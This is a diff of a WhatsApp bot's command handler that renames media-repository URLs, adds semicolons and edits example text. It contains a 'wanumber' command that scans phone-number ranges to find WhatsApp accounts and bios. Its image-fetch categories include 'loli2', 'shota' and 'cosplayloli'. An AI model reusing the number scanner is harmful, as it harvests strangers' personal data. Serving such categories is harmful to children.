-if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/kotori.json')
-if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/kpop.json')
-if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/kucing.json')
-if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/kurumi.json')
-if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/lisa.json')
-if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/loli.json')
-if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/madara.json')
-if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/megumin.json')
-if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/mikasa.json')
-if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/mikey.json')
-if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/miku.json')
-if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/minato.json')
-if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/mobil.json')
-if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/motor.json')
-if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/mountain.json')
-if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/naruto.json')
-if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/nekonime.json')
-if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/nezuko.json')
-if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/onepiece.json')
-if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/pentol.json')
-if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/pokemon.json')
-if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/profil.json')
-if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/programming.json')
-if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/pubg.json')
-if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/randblackpink.json')
-if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/randomnime.json')
-if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/randomnime2.json')
-if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/rize.json')
-if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/rose.json')
-if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/ryujin.json')
-if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/sagiri.json')
-if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/sakura.json')
-if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/sasuke.json')
-if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/satanic.json')
-if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/shina.json')
-if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/shinka.json')
-if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/shinomiya.json')
-if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/shizuka.json')
-if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/shota.json')
-if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/tatasurya.json')
-if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/technology.json')
-if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/tejina.json')
-if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/toukachan.json')
-if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/tsunade.json')
-if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/waifu.json')
-if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/wallhp.json')
-if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/wallml.json')
-if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/wallnime.json')
-if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/yotsuba.json')
-if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/yuki.json')
-if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/yulibocil.json')
-if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/yumeko.json')
+if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/akira.json')
+if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/akiyama.json')
+if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/ana.json')
+if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/art.json')
+if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/asuna.json')
+if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/ayuzawa.json')
+if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/boneka.json')
+if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/boruto.json')
+if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/bts.json')
+if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/cecan.json')
+if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/chiho.json')
+if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/chitoge.json')
+if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/cogan.json')
+if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/cosplay.json')
+if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/cosplayloli.json')
+if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/cosplaysagiri.json')
+if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/cyber.json')
+if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/deidara.json')
+if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/doraemon.json')
+if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/eba.json')
+if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/elaina.json')
+if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/emilia.json')
+if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/erza.json')
+if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/exo.json')
+if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/femdom.json')
+if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/freefire.json')
+if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/gamewallpaper.json')
+if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/glasses.json')
+if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/gremory.json')
+if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/hekel.json')
+if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/hestia.json')
+if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/husbu.json')
+if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/inori.json')
+if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/islamic.json')
+if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/isuzu.json')
+if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/itachi.json')
+if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/itori.json')
+if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/jeni.json')
+if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/jiso.json')
+if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/justina.json')
+if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/kaga.json')
+if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/kagura.json')
+if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/kakasih.json')
+if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/kaori.json')
+if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/kartun.json')
+if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/katakata.json')
+if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/keneki.json')
+if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/kotori.json')
+if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/kpop.json')
+if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/kucing.json')
+if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/kurumi.json')
+if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/lisa.json')
+if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/loli.json')
+if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/madara.json')
+if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/megumin.json')
+if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/mikasa.json')
+if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/mikey.json')
+if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/miku.json')
+if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/minato.json')
+if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/mobil.json')
+if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/motor.json')
+if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/mountain.json')
+if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/naruto.json')
+if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/nekonime.json')
+if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/nezuko.json')
+if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/onepiece.json')
+if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/pentol.json')
+if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/pokemon.json')
+if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/profil.json')
+if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/programming.json')
+if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/pubg.json')
+if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/randblackpink.json')
+if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/randomnime.json')
+if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/randomnime2.json')
+if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/rize.json')
+if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/rose.json')
+if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/ryujin.json')
+if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/sagiri.json')
+if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/sakura.json')
+if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/sasuke.json')
+if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/satanic.json')
+if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/shina.json')
+if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/shinka.json')
+if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/shinomiya.json')
+if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/shizuka.json')
+if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/shota.json')
+if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/tatasurya.json')
+if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/technology.json')
+if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/tejina.json')
+if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/toukachan.json')
+if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/tsunade.json')
+if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/waifu.json')
+if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/wallhp.json')
+if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/wallml.json')
+if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/wallnime.json')
+if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/yotsuba.json')
+if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/yuki.json')
+if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/yulibocil.json')
+if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/master/yumeko.json')
 let yeha = heyy[Math.floor(Math.random() * heyy.length)]
 let msgs = generateWAMessageFromContent(m.chat, {
   viewOnceMessage: {
@@ -10497,9 +10276,8 @@ let msgs = generateWAMessageFromContent(m.chat, {
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'translate':{
   	if (!q) return replygcxenon(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
   	const defaultLang = 'en'
@@ -10565,9 +10343,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
         return replygcxenon(err)
     } 
     }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'coffee': case 'kopi': {
                 let msgs = generateWAMessageFromContent(m.chat, {
   viewOnceMessage: {
@@ -10609,9 +10386,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
             }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'wallpaper': {
                 if (!text) return replygcxenon('Enter Query Title')
                 await XenonStickWait()
@@ -10659,9 +10435,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 
             }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'wikimedia': {
                 if (!text) return replygcxenon('Enter Query Title')
                 await XenonStickWait()
@@ -10709,9 +10484,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 
             }
-            break
+            break;
 //===========================================================================================================================//
-
     case 'aesthetic':{
 await XenonStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
@@ -10757,27 +10531,24 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'ebinary': {
 if (!q) return replygcxenon(`Send/reply text with captions ${prefix + command}`)
 let { eBinary } = require('./lib/binary')
 let eb = await eBinary(`${q}`)
 replygcxenon(eb)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'dbinary': {
 if (!q) return replygcxenon(`Send/reply text with captions ${prefix + command}`)
 let { dBinary } = require('./lib/binary')
 let db = await dBinary(`${q}`)
 replygcxenon(db)
 }
-break
+break;
 //===========================================================================================================================//
-
 			  case 'volaudio': {
 if (!args.join(" ")) return replygcxenon(`Example: ${prefix + command} 10`)
 media = await XenonBotInc.downloadAndSaveMediaMessage(quoted, "volume")
@@ -10790,9 +10561,8 @@ XenonBotInc.sendMessage(m.chat, {audio:jadie, mimetype: 'audio/mp4', ptt: true},
 fs.unlinkSync(rname)
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'volvideo': {
 if (!args.join(" ")) return replygcxenon(`Example: ${prefix + command} 10`)
 media = await XenonBotInc.downloadAndSaveMediaMessage(quoted, "volume")
@@ -10805,9 +10575,8 @@ XenonBotInc.sendMessage(m.chat, {video:jadie, mimetype: 'video/mp4'}, {quoted: m
 fs.unlinkSync(rname)
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'emojimix': {
                 let [emoji1, emoji2] = text.split`+`
                 if (!emoji1) return replygcxenon(`Example : ${prefix + command} 😅+🤔`)
@@ -10822,9 +10591,8 @@ break
                     })
                 }
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                 try {
                 let set
@@ -10855,9 +10623,8 @@ break
                 } catch (e) {
                 replygcxenon(e)
                 }
-                break
+                break;
 //===========================================================================================================================//
-
 			case 'toonce':
             case 'toviewonce': {
                 if (!m.quoted) return replygcxenon(`Reply Image/Video`)
@@ -10897,18 +10664,16 @@ break
                    })
                 }
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'fliptext': {
-                if (args.length < 1) return replygcxenon(`Example:\n${prefix}fliptext Dr Xenon`)
+                if (args.length < 1) return replygcxenon(`Example:\n${prefix}fliptext DrXenon`)
                 quere = args.join(" ")
                 flipe = quere.split('').reverse().join('')
                 replygcxenon(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'style': case 'styletext': {
 		if (!text) return replygcxenon('Enter Query text!')
                 let anu = await styletext(text)
@@ -10918,11 +10683,10 @@ break
                 }
                 replygcxenon(teks)
 	    }
-	    break
+	    break;
 //===========================================================================================================================//
-
 			case 'obfus': case 'obfuscate':{
-if (!text) return replygcxenon(`Example ${prefix+command} const xenonnbot = require('baileys')`)
+if (!text) return replygcxenon(`Example ${prefix+command} const xenonbot = require('baileys')`)
 try {
 let meg = await obfus(text)
 replygcxenon(`Success
@@ -10931,9 +10695,8 @@ ${meg.result}`)
 	replygcxenon(`Use the command properly\nExample ${prefix+command} const xenonbot = require('baileys')`)
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'autodownload': case 'autodl':
 if (!XenonTheCreator) return XenonStickOwner()
                 
@@ -11005,9 +10768,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
   messageId: msg.key.id
 })
 }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'weather':{
 if (!text) return replygcxenon('What location?')
             let wdata = await axios.get(
@@ -11034,18 +10796,16 @@ if (!text) return replygcxenon('What location?')
                 }
            )
            }
-           break
+           break;
 //===========================================================================================================================//
-
            case 'happymod':{
 if (!q) return replygcxenon(`Example ${prefix+command} Sufway surfer mod`)
 await XenonStickWait()
 let kat = await scp2.happymod(q)
 replygcxenon(util.format(kat))
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'gdrive': {
 		if (!args[0]) return replygcxenon(`Enter the Google Drive link`)
 	await XenonStickWait()
@@ -11062,11 +10822,10 @@ case 'gdrive': {
 	replygcxenon('Error: Check link or try another link') 
   }
 }
-break
+break;
 //===========================================================================================================================//
-
            case 'git': case 'gitclone':
-if (!args[0]) return replygcxenon(`Where is the link?\nExample :\n${prefix}${command} https://github.com/Dr.Xenon2/XenonMedia`)
+if (!args[0]) return replygcxenon(`Where is the link?\nExample :\n${prefix}${command} https://github.com/Dr_Xenon1/XenonMedia`)
 if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcxenon(`Link invalid!!`)
 let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
     let [, user, repo] = args[0].match(regex1) || []
@@ -11074,9 +10833,8 @@ let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
     let url = `https://api.github.com/repos/${user}/${repo}/zipball`
     let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
     XenonBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcxenon(mess.error))
-break
+break;
 //===========================================================================================================================//
-
            case 'spotify':{
 	if (!text) return replygcxenon(`*Please enter a song name*`)
     try {
@@ -11112,7 +10870,7 @@ break
             mimetype: 'audio/mpeg',
             ptt: true,
             waveform:  [100, 0, 100, 0, 100, 0, 100],
-            fileName: "Dr_Xenon1",
+            fileName: "DrXenon",
             contextInfo: {
               mentionedJid: [m.sender],
               externalAdReply: {
@@ -11131,9 +10889,8 @@ break
         return replygcxenon('*Error*')
     }
     }
-    break
+    break;
 //===========================================================================================================================//
-
 			case 'mediafire': {
   	if (!args[0]) return replygcxenon(`Enter the mediafire link next to the command`)
     if (!args[0].match(/mediafire/gi)) return replygcxenon(`Link incorrect`)
@@ -11152,9 +10909,8 @@ break
 `.trim()
     XenonBotInc.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
     }
-    break
+    break;
 //===========================================================================================================================//
-
 			case 'remini': {
 			if (!quoted) return replygcxenon(`Where is the picture?`)
 			if (!/image/.test(mime)) return replygcxenon(`Send/Reply Photos With Captions ${prefix + command}`)
@@ -11203,9 +10959,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'imdb':
 if (!text) return replygcxenon(`_Name a Series or movie`)
 await XenonStickWait()
@@ -11238,9 +10993,8 @@ await XenonStickWait()
             }, {
                 quoted: m,
             })
-            break
+            break;
 //===========================================================================================================================//
-
             case 'itunes': {
 if (!text) return replygcxenon('Please provide a song name')
   try {
@@ -11308,9 +11062,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
     console.error(error)
   }
 }
-break
+break;
 //===========================================================================================================================//
-
             case 'lyrics': {
 if (!text) return replygcxenon(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
 await XenonStickWait()
@@ -11368,9 +11121,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 replygcxenon(`Lyrics ${text} not found!`)
 }
 }
-break
+break;
 //===========================================================================================================================//
-
             case 'friend':
 case 'searchfriend':{
 await XenonStickWait()
@@ -11384,11 +11136,10 @@ setTimeout(() => {
 XenonBotInc.sendMessage(m.chat, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
 }, 9000)
 }
-break
+break;
 //===========================================================================================================================//
-
             case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
-           	if (!text) return replygcxenon(`Provide Number with last number x\n\nExample: ${prefix + command} 2250500107362x`)
+           	if (!text) return replygcxenon(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
 var inputnumber = text.split(" ")[0]
         
         replygcxenon(`Searching for WhatsApp account in given range...`)
@@ -11444,9 +11195,8 @@ var inputnumber = text.split(" ")[0]
         }
         replygcxenon(`${text66}${nobio}${nowhatsapp}`)
         }
-break
+break;
 //===========================================================================================================================//
-
 			case 'stickersearch': {
 if (!text) return replygcxenon(`Example : ${m.prefix + command} kururmi`)
 var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
@@ -11497,9 +11247,8 @@ let msgs = generateWAMessageFromContent(m.chat, {
 }, { quoted: m })
 await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'apksearch': {
 if (!text) return replygcxenon(`Example : ${prefix + command} whatsapp`)
 var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
